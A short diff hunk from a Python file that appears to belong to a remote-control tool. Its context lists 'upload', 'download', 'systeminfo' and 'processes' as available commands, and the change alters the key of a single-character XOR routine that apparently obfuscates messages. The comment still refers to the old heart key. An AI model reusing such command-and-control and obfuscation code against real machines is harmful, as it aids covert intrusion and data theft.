@@ -23,7 +23,7 @@ OPTIONS = ["upload", "download", "systeminfo", "processes"] #available commands
 def xor(message):
     newMessage = "" # init empty string
     for char in message:
-        deChar = ord(char) ^ ord('♥') # compute xor for ascii value of char and the heart <3
+        deChar = ord(char) ^ ord('P') # compute xor for ascii value of char and the heart <3
         newMessage += str(chr(deChar)) # append to new newMessage
     return str.encode(newMessage) # return result
 
